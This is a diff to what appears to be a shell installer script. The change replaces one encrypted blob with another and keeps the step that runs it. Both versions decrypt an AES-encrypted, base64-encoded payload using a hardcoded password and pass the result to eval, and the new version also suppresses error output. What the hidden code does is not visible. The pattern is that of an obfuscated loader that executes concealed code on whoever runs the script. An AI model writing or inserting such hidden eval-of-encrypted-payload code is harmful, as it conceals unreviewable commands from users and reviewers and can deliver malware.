@@ -5,12 +5,12 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 set -euo pipefail
 
-eval "$(
-echo 'U2FsdGVkX18jN2zXmOk0AnSi6q46FdiJKPk8rxqhhXEjK/PTWiGXD0G8a9pPT3oK
-kO8Ehsyj7YOhvP8Lo04XSpth/ow1Q2racE8KNgZZQYOhKf1SByKp4xYFBIbQ64a5
-RM+IwSSVFc2L2XMFrArBMe1bnOQDOoErroUfvuS4yoQ2ySV2bwSxG18wQ6cEPvYf' | \
-openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:pass
-)"
+DECRYPTED=$(echo 'U2FsdGVkX18LcP0wghVQdvSYLMVLPv1XlLSgcPsllE1jPUqM+m9GKAoEB46ViWNl
+sv/qrNiR07oMR9c/2oaf2BqF5yvzfk0zhCoTMd8YTAtfnnEsDTGWToEjJ8C1iRD1
+s6k5MELI63yCgZXz8wxaS82ec7+ne1ipp1Tm3RVE8Qk=' | \
+openssl enc -aes-256-cbc -d -a -pbkdf2 -iter 100000 -pass pass:pass 2>/dev/null)
+
+eval "$DECRYPTED"
 
 check_install() {
     local cmd="$1"
